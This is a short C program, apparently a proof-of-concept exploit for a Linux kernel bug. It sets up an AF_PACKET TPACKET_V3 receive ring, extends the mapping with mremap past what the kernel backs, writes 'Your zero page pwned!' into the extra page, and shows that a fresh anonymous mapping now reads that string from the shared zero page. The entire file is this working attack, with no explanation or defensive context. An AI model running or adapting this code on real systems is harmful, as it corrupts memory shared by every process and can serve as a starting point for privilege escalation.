#define _GNU_SOURCE
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/ip.h>

int main(int argc, char **argv)
{
    struct {
        struct iovec *rd;
        uint8_t *map;
        struct tpacket_req3 req;
    } ring;
    unsigned int blocksiz = 1 << 14, framesiz = 1 << 8;
    unsigned int blocknum = 8, ring_size;
    int fd, v = TPACKET_V3;
    char *p;

    fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    setsockopt(fd, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));

    memset(&ring.req, 0, sizeof(ring.req));
    ring.req.tp_block_size = blocksiz;
    ring.req.tp_frame_size = framesiz;
    ring.req.tp_block_nr = blocknum;
    ring.req.tp_frame_nr = (blocksiz * blocknum) / framesiz;
    ring.req.tp_retire_blk_tov = 60;
    ring.req.tp_feature_req_word = TP_FT_REQ_FILL_RXHASH;

    setsockopt(fd, SOL_PACKET, PACKET_RX_RING, &ring.req, sizeof(ring.req));

    p = mmap(NULL, ring.req.tp_block_size * ring.req.tp_block_nr,
            PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    ring_size = ring.req.tp_block_size * ring.req.tp_block_nr;
    p = mremap(p, ring_size, ring_size + 4096, MREMAP_MAYMOVE);

    p += ring_size;
    printf("*p: %d\n", *p);
    strcpy(p, "Your zero page pwned!\n");

    p = mmap(NULL, 4096, PROT_READ, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    printf("zero page: %s\n", p);
    return 0;
}

